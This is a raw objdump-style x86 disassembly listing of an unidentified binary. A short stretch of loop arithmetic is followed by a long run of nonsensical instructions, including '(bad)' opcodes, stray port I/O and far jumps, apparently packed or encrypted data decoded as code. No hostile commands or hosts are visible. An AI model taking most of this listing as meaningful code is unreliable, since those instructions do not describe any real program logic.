  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	ror    esi,0x99
  405133:	xchg   edx,eax
  405134:	mov    DWORD PTR [ebx+0x2b],edx
  405137:	jo     0x4051a9
  405139:	cmp    eax,0xb470707d
  40513e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40513f:	ret    0xddf0
  405142:	(bad)  [ecx-0x3a03030]
  405148:	imul   edx,DWORD PTR [ecx-0x4],0x3459e78b
  40514f:	dec    edx
  405150:	add    eax,0xa7d39a2b
  405155:	xchg   ebp,eax
  405156:	rcl    DWORD PTR [esi],0x79
  405159:	or     dl,bh
  40515b:	mov    dh,0xa0
  40515d:	popf   
  40515e:	xor    ah,BYTE PTR [ebp+0x4]
  405161:	gs xchg esp,eax
  405163:	cmp    BYTE PTR [ecx+0x67318861],0x89
  40516a:	repnz shl DWORD PTR [edx],1
  40516d:	ss (bad) 
  40516f:	xor    dh,BYTE PTR [ebx]
  405171:	(bad)  
  405172:	xor    dl,BYTE PTR [esi+edx*1]
  405175:	push   ebx
  405176:	and    BYTE PTR [ebp+0x7ede90e3],dh
  40517c:	shr    edx,cl
  40517e:	mov    al,0x86
  405180:	jl     0x405128
  405182:	cwde   
  405183:	ins    DWORD PTR es:[edi],dx
  405184:	inc    edx
  405185:	pop    ebx
  405186:	mov    ah,BYTE PTR [edx+0x55284e97]
  40518c:	cmp    DWORD PTR [ebx+ecx*2+0x5dbd7a70],ebx
  405193:	sub    al,cl
  405195:	mov    ds:0xd41ceb6e,eax
  40519a:	add    BYTE PTR [ebx],bl
  40519c:	push   0x58
  40519e:	mov    esi,0xe243b49d
  4051a3:	mov    ebx,0x1ee5d3d3
  4051a8:	repz leave 
  4051aa:	(bad)  
  4051ab:	mov    al,ds:0x8df930f5
  4051b0:	mov    esi,0x44ad652f
  4051b5:	push   ss
  4051b6:	push   0x25f1dcbd
  4051bb:	(bad)  
  4051bc:	xor    DWORD PTR [edx+0x19],ecx
  4051bf:	jge    0x405234
  4051c1:	dec    ecx
  4051c2:	jmp    0xc7ced8c3
  4051c7:	shl    DWORD PTR [ecx+ecx*8-0x11811c9f],cl
  4051ce:	ins    BYTE PTR es:[edi],dx
  4051cf:	mul    bl
  4051d1:	lods   al,BYTE PTR ds:[esi]
  4051d2:	push   esp
  4051d3:	call   0x77be76
  4051d8:	shr    DWORD PTR [ecx],cl
  4051da:	(bad)  
  4051db:	(bad)  
  4051dc:	out    dx,eax
  4051dd:	mov    dl,0xee
  4051df:	push   ds
  4051e0:	enter  0xecdd,0x40
  4051e4:	jmp    0x4051a6
  4051e6:	xor    al,0x5e
  4051e8:	mov    al,0x91
  4051ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051eb:	(bad)  
  4051ed:	(bad)
  4051f1:	sub    DWORD PTR [edi-0x50423824],eax
  4051f7:	push   esp
  4051f8:	push   ecx
  4051f9:	ss jnp 0x405232
  4051fc:	inc    ebp
  4051fd:	cmp    bh,BYTE PTR [edi]
  4051ff:	inc    edx
  405200:	cwde   
  405201:	push   ds
  405202:	test   al,0x3
  405204:	mov    ah,0x67
  405206:	jp     0x4051ef
  405208:	fdivr  st(5),st
  40520a:	scas   eax,DWORD PTR es:[edi]
  40520b:	sbb    eax,0x402d9933
  405210:	mov    bh,0x83
  405212:	into   
  405213:	cs or  ecx,esi
  405216:	or     al,0xd5
  405218:	add    dl,BYTE PTR [ebp-0x15]
  40521b:	rcl    BYTE PTR [ebp+0x6],1
  40521e:	loope  0x405287
  405220:	push   ebx
  405221:	add    DWORD PTR [ebx+0x40],ecx
  405224:	jge    0x405236
  405226:	pop    sp
  405228:	rol    cl,0xd5
  40522b:	fs xchg ebx,eax
  40522d:	lea    edx,[ebx+0x1b]
  405230:	sbb    DWORD PTR [ebx+0x10c44624],0x66
  405237:	imul   eax,DWORD PTR [ebx],0x2a
  40523a:	xchg   ebx,eax
  40523b:	and    al,ch
  40523d:	in     eax,dx
  40523e:	(bad)  
  40523f:	mov    ds:0xceef1ac0,eax
  405244:	jecxz  0x405249
  405246:	inc    ecx
  405247:	sbb    al,0x57
  405249:	or     al,0x67
  40524b:	cmp    bh,BYTE PTR [ebx+0x11]
  40524e:	icebp  
  40524f:	ret    
  405250:	loopne 0x405200
  405252:	fadd   QWORD PTR [eax+0x45]
  405255:	adc    BYTE PTR [edi-0x3c],al
  405258:	popa   
  405259:	mov    ?,WORD PTR [eax]
  40525b:	pop    ecx
  40525c:	cli    
  40525d:	xor    eax,0x12b9c43f
  405262:	sub    edi,DWORD PTR [ebx]
  405264:	inc    edi
  405265:	adc    BYTE PTR [ebp+0x4a],dl
  405268:	mov    BYTE PTR [ebx+0x6529d9e8],0x75
  40526f:	jge    0x40526a
  405271:	aas    
  405272:	or     al,0x16
  405274:	in     al,0x6d
  405276:	push   ecx
  405277:	or     DWORD PTR [ebx+0x7c],ebp
  40527a:	pop    ebp
  40527b:	ja     0x4052ce
  40527d:	pop    esi
  40527e:	push   edx
  40527f:	push   ebp
  405280:	in     eax,0xee
  405282:	adc    dh,BYTE PTR [eax]
  405284:	xchg   ebp,eax
  405285:	jne    0x40527c
  405287:	xchg   DWORD PTR [ecx-0x4b],ebx
  40528a:	int    0xa8
  40528c:	cmp    al,0x9d
  40528e:	sbb    ch,BYTE PTR [ecx]
  405290:	add    ebx,DWORD PTR [edx]
  405292:	cmp    BYTE PTR [edx],0x96
  405295:	push   edi
  405296:	mov    esp,0x5b7d376e
  40529b:	push   ecx
  40529c:	cdq    
  40529d:	push   es
  40529e:	xchg   esp,eax
  40529f:	mov    ds:0x5e7d3934,eax
  4052a4:	pop    es
  4052a5:	pop    edi
  4052a6:	cwde   
  4052a7:	test   DWORD PTR [eax-0x32],edx
  4052aa:	pop    ecx
  4052ab:	je     0x40523a
  4052ad:	mov    ch,0x77
  4052af:	mov    ds:0x60206dc7,eax
  4052b4:	(bad)  [edx+ebx*4-0x3a42b19b]
  4052bb:	xchg   bh,cl
  4052bd:	jns    0x40532e
  4052bf:	in     eax,dx
  4052c0:	adc    edx,0x1381fcd0
  4052c6:	dec    ebx
  4052c7:	inc    ebp
  4052c8:	retf   0x676
  4052cb:	fild   QWORD PTR [ebx]
  4052cd:	stos   DWORD PTR es:[edi],eax
  4052ce:	jmp    0x380a:0x3e6bcb6e
  4052d5:	lea    ebx,[ebx]
  4052d7:	push   ebx
  4052d8:	imul   edi,esp,0x51a4857d
  4052de:	dec    ecx
  4052df:	mov    al,0xdb
  4052e1:	cwde   
  4052e2:	lea    eax,[eax-0x43]
  4052e5:	call   0x52b5b865
  4052ea:	popf   
  4052eb:	sbb    ch,BYTE PTR [eax]
  4052ed:	dec    edx
  4052ee:	or     BYTE PTR [eax],bh
  4052f0:	push   eax
  4052f1:	pushf  
  4052f2:	cmp    esi,DWORD PTR [edx-0x4d73acf1]
  4052f8:	or     dl,BYTE PTR [ebp+edx*8-0x69]
  4052fc:	mov    ah,0xb8
  4052fe:	adc    eax,0x383d849f
  405303:	not    al
  405305:	pop    ecx
  405306:	adc    ebx,edx
  405308:	(bad)  
  405309:	xchg   esp,eax
  40530a:	icebp  
  40530b:	mov    ds:0x45f120bd,eax
  405310:	jno    0x405310
  405312:	xor    eax,0x153eb5c9
  405317:	cmp    al,0xe3
  405319:	xor    BYTE PTR [ebx*8-0x6e4498af],0x2b
  405321:	pop    ebx
  405322:	stc    
  405323:	fist   DWORD PTR [edi+0x39dc24ea]
  405329:	addr16 and eax,0xac92cf21
  40532f:	and    eax,0x9f500153
  405334:	jl     0x4052cd
  405336:	cmc    
  405337:	inc    esi
  405338:	jmp    DWORD PTR [edx]
  40533a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40533b:	outs   dx,DWORD PTR ds:[esi]
  40533c:	sysret 
  40533e:	pop    ecx
  40533f:	jnp    0x4053b9
  405341:	push   es
  405342:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405343:	lods   al,BYTE PTR ds:[esi]
  405344:	fs xor eax,0x8ffe6604
  40534a:	fidiv  WORD PTR [edx]
  40534c:	push   0xffffff95
  40534e:	add    BYTE PTR [eax],ah
  405350:	popf   
  405351:	lock xlat BYTE PTR ds:[ebx]
  405353:	sbb    eax,eax
  405355:	pop    esp
  405356:	mov    ebx,eax
  405358:	dec    eax
  405359:	jmp    0x18392793
  40535e:	not    BYTE PTR [ebx-0x26]
  405361:	add    BYTE PTR [esp+eiz*2+0x4ceab7c8],0xb2
  405369:	arpl   WORD PTR [edx],sp
  40536b:	xchg   ecx,eax
  40536c:	adc    al,0xbe
  40536e:	dec    edx
  40536f:	imul   ebx,edi,0xffffffc0
  405372:	data16 hlt 
  405374:	call   0xf412:0x91a8a2ea
  40537b:	sar    BYTE PTR [edx-0xa70e6c5],0x94
  405382:	cdq    
  405383:	mov    ds:0xb691c891,al
  405388:	push   ebp
  405389:	sub    eax,0x42af0bf4
  40538e:	dec    ebp
  40538f:	cdq    
  405390:	sub    DWORD PTR [eax-0x2023c3d6],ecx
  405396:	lods   eax,DWORD PTR ds:[esi]
  405397:	xchg   bh,bh
  405399:	jl     0x40534a
  40539b:	aam    0x68
  40539d:	sub    BYTE PTR [edi],ch
  40539f:	or     edx,0x78
  4053a2:	fcomp  st(4)
  4053a4:	out    dx,al
  4053a5:	add    eax,esp
  4053a7:	aad    0x54
  4053a9:	(bad)  
  4053aa:	jmp    eax
  4053ac:	mov    al,0xc1
  4053ae:	loope  0x4053b7
  4053b0:	mov    al,ds:0x4b738452
  4053b5:	mov    BYTE PTR [edi+0x67],al
  4053b8:	enter  0xed87,0xe
  4053bc:	cmp    al,0x64
  4053be:	pop    ds
  4053bf:	xor    ch,ah
  4053c1:	out    dx,al
  4053c2:	xchg   ecx,eax
  4053c3:	fidiv  DWORD PTR [edx+0x3b]
  4053c6:	inc    eax
  4053c7:	retf   0xb14b
  4053ca:	xlat   BYTE PTR ds:[ebx]
  4053cb:	cli    
  4053cc:	mov    dh,0x1
  4053ce:	mov    ds:0x1d62cd70,eax
  4053d3:	pop    ebp
  4053d4:	nop
  4053d5:	rol    DWORD PTR ds:0x82631b1a,0x3a
  4053dc:	mov    esp,0xa144d0f2
  4053e1:	inc    ebp
  4053e2:	lds    ebp,FWORD PTR [edi]
  4053e4:	bound  ecx,QWORD PTR ds:0xbd8db92d
  4053ea:	mov    al,dh
  4053ec:	add    al,0xfd
  4053ee:	hlt    
  4053ef:	sub    DWORD PTR [edi],esi
  4053f1:	sbb    eax,0xb07d7d5b
  4053f6:	add    BYTE PTR [di-0x65],bl
  4053fa:	cdq    
  4053fb:	cmc    
  4053fc:	daa    
  4053fd:	sbb    al,0xe7
  4053ff:	(bad)  
  405400:	jmp    0xe48b8c5e
  405405:	jmp    FWORD PTR [eax+0x47]
  405408:	pop    es
  405409:	xchg   ebx,edi
  40540b:	add    BYTE PTR [eax+edx*4-0x6c1a0cd0],0x74
  405413:	fmul   QWORD PTR [eax]
  405415:	pop    edx
  405416:	std    
  405417:	bound  esp,QWORD PTR [ebx-0x53a07959]
  40541d:	je     0x4053c9
  40541f:	jp     0x4053af
  405421:	icebp  
  405422:	(bad)  
  405423:	push   edi
  405424:	test   DWORD PTR [ebx+ebx*8+0x9],ebp
  405428:	dec    ebp
  405429:	sbb    BYTE PTR [eax+0x827ff19],dh
  40542f:	push   0x46fa82b8
  405434:	xchg   ebp,eax
  405435:	outs   dx,BYTE PTR ds:[esi]
  405436:	fidivr DWORD PTR [ecx-0x19]
  405439:	and    DWORD PTR [edx+0x2],eax
  40543c:	sub    al,0x58
  40543e:	mov    WORD PTR [ecx+0x51e935ba],?
  405444:	out    0xd4,al
  405446:	push   ds
  405447:	xchg   ebx,eax
  405448:	stc    
  405449:	cmp    BYTE PTR [eax-0x28],0xd9
  40544d:	dec    BYTE PTR [ecx+ebx*2-0x37]
  405451:	jl     0x405446
  405453:	mov    dl,0xcf
  405455:	retf   0x4070
  405458:	std    
  405459:	arpl   WORD PTR [edi-0x7e],sp
  40545c:	cmp    al,0x56
  40545e:	pushf  
  40545f:	or     eax,DWORD PTR [edi-0xb]
  405462:	ja     0x40540c
  405464:	retf   0x9b4c
  405467:	sub    ah,cl
  405469:	cmp    ah,bh
  40546b:	jge    0x4054d2
  40546d:	adc    DWORD PTR [edi+0x21bd5ab5],eax
  405473:	mov    WORD PTR [ecx+0x65],?
  405476:	sub    ebp,DWORD PTR [edx+0x3e]
  405479:	mov    ds:0xc7f7a344,eax
  40547e:	sbb    BYTE PTR [ecx+0xcc2c95e],bh
  405484:	add    BYTE PTR [ebp-0x75],dl
  405487:	in     al,dx
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e884
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e7eb,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	xchg   ecx,eax
  4054a9:	aad    0x66
  4054ab:	aas    
  4054ac:	adc    BYTE PTR [edi],dh
  4054ae:	jo     0x405520
  4054b0:	stos   BYTE PTR es:[edi],al
  4054b1:	jle    0x405523
  4054b3:	jo     0x4054fe
  4054b5:	test   eax,0x6e963c63
  4054ba:	scas   al,BYTE PTR es:[edi]
  4054bb:	cmc    
  4054bc:	or     eax,DWORD PTR [eax+eiz*1]
  4054bf:	sti    
  4054c0:	pop    eax
  4054c1:	(bad)  [edx]
  4054c3:	adc    eax,0x202850ca
  4054c8:	in     eax,dx
  4054c9:	mov    eax,0x34ff4942
  4054ce:	push   esi
  4054cf:	ins    DWORD PTR es:[edi],dx
  4054d0:	test   eax,0x5f3c168b
  4054d5:	scas   eax,DWORD PTR es:[edi]
  4054d6:	xor    BYTE PTR [esi],dh
  4054d8:	in     eax,dx
  4054d9:	in     al,dx
  4054da:	mov    ebx,0x5b7bff4e
  4054df:	and    DWORD PTR [ebp-0x1a6c8891],ebx
  4054e5:	sbb    eax,0xea4530aa
  4054ea:	sub    BYTE PTR [eax+0x5ebb343a],dh
  4054f0:	fisubr DWORD PTR [eax-0xa]
  4054f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054f4:	das    
  4054f5:	push   edx
  4054f6:	adc    esp,DWORD PTR [ebx-0x40]
  4054f9:	pop    esi
  4054fa:	sub    ch,al
  4054fc:	and    edx,DWORD PTR [esi-0x77]
  4054ff:	pop    ds
  405500:	ret    0xf3a4
  405503:	(bad)  
  405504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405505:	out    0xff,al
  405507:	sbb    al,0x8
  405509:	adc    ebx,DWORD PTR [ecx+0x76]
  40550c:	lea    ebp,[ecx+0x2daefd0c]
  405512:	cmp    al,0xff
  405514:	sahf   
  405515:	mov    ch,0xe4
  405517:	add    ebp,DWORD PTR [eax]
  405519:	mov    ch,0xd2
  40551b:	xchg   edx,eax
  40551c:	adc    DWORD PTR [ecx],edx
  40551e:	lock ficomp DWORD PTR [edi-0x59]
  405522:	mov    edx,0x8c1d48b5
  405527:	xchg   DWORD PTR [edx-0x7e58d1c],eax
  40552d:	imul   esi,DWORD PTR [edx+edx*1+0x2a972e6c],0xffffffa4
  405535:	pop    ds
  405536:	ins    BYTE PTR es:[edi],dx
  405537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405538:	xchg   ch,bh
  40553a:	jmp    0x405574
  40553c:	adc    edx,esi
  40553e:	jl     0x4055b4
  405540:	inc    edi
  405541:	in     al,0xc5
  405543:	ss in  eax,0xf8
  405546:	sub    dl,BYTE PTR [ecx]
  405548:	cmp    eax,0x61c51664
  40554d:	add    ebx,esp
  40554f:	enter  0x93b0,0x4
  405553:	cmp    DWORD PTR [edi+ebp*1+0x4d9ee6cd],edi
  40555a:	mov    ch,0x1c
  40555c:	inc    edi
  40555d:	test   eax,0xba8b96ab
  405562:	mov    ecx,0x9500602d
  405567:	add    DWORD PTR [edi],ecx
  405569:	xor    DWORD PTR [ecx],edx
  40556b:	add    al,0xeb
  40556d:	push   es
  40556e:	test   eax,0xfbd18c0f
  405573:	mov    WORD PTR [edx+eax*8],?
  405576:	jmp    0xc9816cf7
  40557b:	or     al,0xff
  40557d:	add    eax,0x8a3aa0e1
  405582:	pusha  
  405583:	mov    ebp,0xff0efa73
  405588:	sahf   
  405589:	xchg   ebp,eax
  40558a:	xchg   edi,edi
  40558c:	push   edi
  40558d:	inc    esp
  40558e:	cs cmp esi,esp
  405591:	mov    dh,0x40
  405593:	inc    ebx
  405594:	stos   DWORD PTR es:[edi],eax
  405595:	aas    
  405596:	enter  0xf5b7,0x8a
  40559a:	xchg   edx,eax
  40559b:	(bad)  
  40559c:	xor    ebp,eax
  40559e:	aaa    
  40559f:	pop    es
  4055a0:	dec    eax
  4055a1:	push   ss
  4055a2:	and    BYTE PTR [edi-0x22],dl
  4055a5:	dec    edi
  4055a6:	mov    cl,0xd7
  4055a8:	outs   dx,BYTE PTR ds:[esi]
  4055a9:	push   esp
  4055aa:	xor    al,0x3f
  4055ac:	nop
  4055ad:	and    BYTE PTR [edi-0x6c],al
  4055b0:	jb     0x405629
  4055b2:	adc    DWORD PTR [ebx-0x4911e87e],esi
  4055b8:	mov    ebp,0x327d74c8
  4055bd:	ins    BYTE PTR es:[edi],dx
  4055be:	sbb    DWORD PTR [ebx],esp
  4055c0:	ret    
  4055c1:	data16 out 0x17,al
  4055c4:	sub    BYTE PTR [esi+0x7c09749d],0xc3
  4055cb:	pop    ss
  4055cc:	jmp    0x825c:0xaa83c0d5
  4055d3:	xor    DWORD PTR [eax],ebp
  4055d5:	cmp    DWORD PTR [ecx+0x28],esi
  4055d8:	out    0x35,al
  4055da:	mov    ds:0xdc9b7739,eax
  4055df:	gs dec esi
  4055e1:	push   esp
  4055e2:	xor    BYTE PTR [ecx],dh
  4055e4:	adc    esp,DWORD PTR [edx+0xe6b61fb]
  4055ea:	mov    ecx,0x3aefef8c
  4055ef:	inc    edi
  4055f0:	adc    DWORD PTR [ecx+0x144126b1],edi
  4055f6:	lahf   
  4055f7:	inc    ecx
  4055f8:	push   ss
  4055f9:	(bad)
  4055fd:	mov    eax,ds:0x6d68a2c3
  405602:	fnsave ds:0xb564dbba
  405608:	sbb    ebp,DWORD PTR ds:0x9c877309
  40560e:	test   BYTE PTR [ecx],dh
  405610:	sahf   
  405611:	fs push ss
  405613:	sbb    DWORD PTR [ebp+0x55],ebx
  405616:	sub    BYTE PTR [eax-0x1b],0x4d
  40561a:	push   0x85646519
  40561f:	cwde   
  405620:	push   ebp
  405621:	sub    al,0x57
  405623:	lds    ecx,FWORD PTR [ebx+0x75]
  405626:	stos   BYTE PTR es:[edi],al
  405627:	jg     0x405686
  405629:	ds jmp 0x405654
  40562c:	add    cl,BYTE PTR [esp+esi*2]
  40562f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405630:	inc    ebp
  405631:	adc    eax,0xcdc15ee2
  405636:	fwait
  405637:	pop    ebp
  405638:	call   FWORD PTR [edi+ebx*2-0x5712962]
  40563f:	push   eax
  405640:	push   ebp
  405641:	dec    esi
  405642:	xor    eax,0x6765e298
  405647:	sub    ecx,DWORD PTR [edi-0x614dbc8c]
  40564d:	adc    al,0x94
  40564f:	cmc    
  405650:	push   0xdbb6af0a
  405655:	clc    
  405656:	push   ebp
  405657:	lahf   
  405658:	sar    DWORD PTR [edx+0x3a51230e],cl
  40565e:	or     BYTE PTR [esi-0x1a7b77ba],0x5a
  405665:	stos   BYTE PTR es:[edi],al
  405666:	nop
  405667:	cdq    
  405668:	mov    ebx,0xee55e400
  40566d:	cmp    BYTE PTR [edi],dl
  40566f:	cmp    al,0xe1
  405671:	mov    ecx,0xa937405d
  405676:	imul   edx,DWORD PTR [ecx],0x49031950
  40567c:	sbb    BYTE PTR [eax-0x72b0d2d4],ch
  405682:	dec    edi
  405683:	imul   esp,DWORD PTR [edi-0x55],0x3e
  405687:	push   esp
  405688:	mov    eax,0x3a282b28
  40568d:	jae    0x4056cd
  40568f:	js     0x40565b
  405691:	popa   
  405692:	pushf  
  405693:	repnz div BYTE PTR [ecx]
  405696:	adc    edx,DWORD PTR [ebx-0x79]
  405699:	xor    eax,0xe5f909f8
  40569e:	rcr    DWORD PTR [eax-0x3c],0xf4
  4056a2:	loope  0x405674
  4056a4:	inc    ebx
  4056a5:	xor    DWORD PTR [ebx],esp
  4056a7:	pushf  
  4056a8:	dec    edx
  4056a9:	adc    al,0x64
  4056ab:	sub    eax,0x50c42755
  4056b0:	push   0x22
  4056b2:	pop    es
  4056b3:	sub    BYTE PTR [edx-0x24e228d6],cl
  4056b9:	in     al,0xc8
  4056bb:	je     0x405662
  4056bd:	xor    al,BYTE PTR [ebx+ebx*4+0x68]
  4056c1:	sahf   
  4056c2:	cdq    
  4056c3:	push   esi
  4056c4:	xchg   ebp,eax
  4056c5:	arpl   WORD PTR [edi+0xf],dx
  4056c8:	cdq    
  4056c9:	push   es
  4056ca:	lods   eax,DWORD PTR ds:[esi]
  4056cb:	xor    eax,0xebcb667c
  4056d0:	mov    esp,0x23469334
  4056d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056d6:	sahf   
  4056d7:	pushf  
  4056d8:	outs   dx,BYTE PTR ds:[esi]
  4056d9:	and    dl,bh
  4056db:	xor    BYTE PTR [edi+edx*1],0x33
  4056df:	mov    bl,BYTE PTR [ebx+esi*2-0x5f3dbd0c]
  4056e6:	and    DWORD PTR [esi],esi
  4056e8:	dec    esp
  4056e9:	jne    0x405673
  4056eb:	daa    
  4056ec:	imul   esi,DWORD PTR [ebp+0x126d5a21],0x95f1e9c2
  4056f6:	(bad)  
  4056f7:	fisttp DWORD PTR [eax]
  4056f9:	or     edx,ecx
  4056fb:	fnstcw WORD PTR [edx+0x78]
  4056fe:	call   0x48ff:0xa194388c
  405705:	shr    DWORD PTR [ebp+0x268144ec],0x99
  40570c:	inc    ecx
  40570e:	mov    eax,0x38d966f2
  405713:	fsub   DWORD PTR [edi]
  405715:	lods   eax,DWORD PTR ds:[esi]
  405716:	xchg   esi,eax
  405717:	mov    ah,0xc
  405719:	ficom  WORD PTR [edi]
  40571b:	out    dx,eax
  40571c:	or     ah,ah
  40571e:	xchg   ecx,eax
  40571f:	push   edi
  405720:	inc    ebx
  405721:	aad    0x85
  405723:	pusha  
  405724:	hlt    
  405725:	cmp    al,0x48
  405727:	jecxz  0x405798
  405729:	fiadd  DWORD PTR [ecx-0x23]
  40572c:	mov    dh,0xd7
  40572e:	push   ecx
  40572f:	rcr    BYTE PTR [ebp-0x3357ac06],0x4
  405736:	fnstcw WORD PTR [edi]
  405738:	mov    esi,0x1c8f90d0
  40573d:	mov    DWORD PTR [ecx+0x23],edx
  405740:	(bad)  
  405741:	mov    ?,esi
  405743:	or     ch,bh
  405745:	sbb    DWORD PTR [eax],eax
  405747:	jnp    0x4056ee
  405749:	adc    BYTE PTR [esi+0x5c],bh
  40574c:	cmp    eax,0x36a4a5e1
  405751:	lea    eax,[ebx-0x6ef27692]
  405757:	jo     0x40578a
  405759:	scas   al,BYTE PTR es:[edi]
  40575a:	jno    0x4057a6
  40575c:	sub    BYTE PTR [esi],dh
  40575e:	mov    ch,BYTE PTR [ebp-0x68]
  405761:	hlt    
  405762:	xchg   DWORD PTR [ecx+0x67],edi
  405765:	pusha  
  405766:	and    al,0x3d
  405768:	mov    edi,0xb70f51d1
  40576d:	add    eax,0x42fe86
  405772:	and    eax,DWORD PTR ds:0x42fe7a
  405778:	mov    ds:0x42fe86,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx+0x708991be],eax
  405790:	mov    cl,0x53
  405792:	dec    edx
  405793:	xor    eax,0x7eaa7070
  405798:	jo     0x40580a
  40579a:	add    al,0xce
  40579c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40579d:	and    DWORD PTR [eax],0xffffffb0
  4057a0:	outs   dx,BYTE PTR ds:[esi]
  4057a1:	sub    eax,0xb697a7eb
  4057a6:	(bad)  
  4057a7:	iret   
  4057a8:	mov    cl,0x90
  4057aa:	jl     0x4057fc
  4057ac:	sti    
  4057ad:	test   BYTE PTR [ebx+0x1e],bl
  4057b0:	and    DWORD PTR ss:[ecx-0x64],edi
  4057b4:	add    al,0xff
  4057b6:	inc    ebp
  4057b7:	in     al,dx
  4057b8:	jg     0x405771
  4057ba:	pop    ecx
  4057bb:	or     cl,BYTE PTR [ebp+0x7]
  4057be:	xor    DWORD PTR [ebx-0x3a8fde51],0xbe82c2f8
  4057c8:	jne    0x4057ff
  4057ca:	int    0x17
  4057cc:	pusha  
  4057cd:	xchg   ebx,eax
  4057ce:	scas   eax,DWORD PTR es:[edi]
  4057cf:	fmulp  st(4),st
  4057d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057d2:	adc    eax,0x824f0d12
  4057d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057d8:	jb     0x40578d
  4057da:	vpshab xmm13,xmm6,[ebx+0xc]
  4057e0:	mov    WORD PTR [edx+0x5d],?
  4057e3:	pop    esp
  4057e4:	neg    BYTE PTR [ebp-0x55f5c223]
  4057ea:	dec    edx
  4057eb:	pop    ecx
  4057ec:	dec    edx
  4057ed:	mov    BYTE PTR [ecx+eax*1-0x53],cl
  4057f1:	mov    bl,0x50
  4057f3:	cmp    dl,BYTE PTR [ebp-0x11]
  4057f6:	outs   dx,DWORD PTR ds:[esi]
  4057f7:	lock mov bl,0xd4
  4057fa:	cmc    
  4057fb:	push   esp
  4057fc:	push   edi
  4057fd:	add    al,0x2e
  4057ff:	inc    esi
  405800:	repnz xor bl,BYTE PTR [edx+0x5e1050f2]
  405807:	mov    eax,0x50d69186
  40580c:	das    
  40580d:	mov    DWORD PTR [ebp-0xd],edi
  405810:	rol    DWORD PTR [esi-0x45],1
  405813:	out    0x9a,eax
  405815:	cmp    DWORD PTR [esi-0x64e19d9e],ebp
  40581b:	test   BYTE PTR [ebx],0x1
  40581e:	icebp  
  40581f:	jbe    0x4057e1
  405821:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405822:	push   esp
  405823:	cs push cs
  405825:	jbe    0x405871
  405827:	jnp    0x40580c
  405829:	jl     0xa6347c81
  40582f:	inc    ebx
  405830:	popf   
  405831:	xor    ch,al
  405833:	push   esp
  405834:	iret   
  405835:	jns    0x4057fb
  405837:	pop    ecx
  405838:	stos   BYTE PTR es:[edi],al
  405839:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40583a:	dec    ebp
  40583b:	call   DWORD PTR [edi-0x729d0bd4]
  405841:	ret    
  405842:	imul   eax,DWORD PTR [ecx+0x1ec99460],0x52
  405849:	xchg   DWORD PTR [ebp-0x477a8835],eax
  40584f:	push   ebp
  405850:	in     al,0x66
  405852:	xor    eax,0xe1763659
  405857:	xor    BYTE PTR [edx+0x3bc9468f],0xb9
  40585e:	jmp    0xf4a2:0xfbd4a823
  405865:	mov    cs,edi
  405867:	popf   
  405868:	inc    edi
  405869:	retf   0x5e48
  40586c:	jno    0x4058be
  40586e:	xchg   ebx,eax
  40586f:	jo     0x405826
  405871:	stos   DWORD PTR es:[edi],eax
  405872:	pop    ss
  405873:	cmp    eax,0xb21014e0
  405878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405879:	mov    dl,0xfd
  40587b:	(bad)  
  40587c:	call   0x153b806d
  405881:	leave  
  405882:	mov    dl,0xa
  405884:	pusha  
  405885:	ins    BYTE PTR es:[edi],dx
  405886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405887:	aaa    
  405888:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405889:	jns    0x405847
  40588b:	mov    esi,esp
  40588d:	mov    dh,0xb9
  40588f:	imul   ecx,DWORD PTR [ebx],0xffffffc2
  405892:	dec    ebx
  405893:	jmp    0x40584b
  405895:	sar    DWORD PTR [edx-0x80],1
  405898:	aam    0x58
  40589a:	bound  esi,QWORD PTR [ecx+0x67]
  40589d:	pop    edi
  40589e:	cmp    edi,DWORD PTR [ecx+0x71]
  4058a1:	sahf   
  4058a2:	xchg   esp,eax
  4058a3:	mov    bh,0xc7
  4058a5:	mov    ebx,DWORD PTR [esi-0x5e380202]
  4058ab:	fdiv   QWORD PTR [edx+0x57]
  4058ae:	dec    edi
  4058af:	ja     0x4058b2
  4058b1:	push   ebp
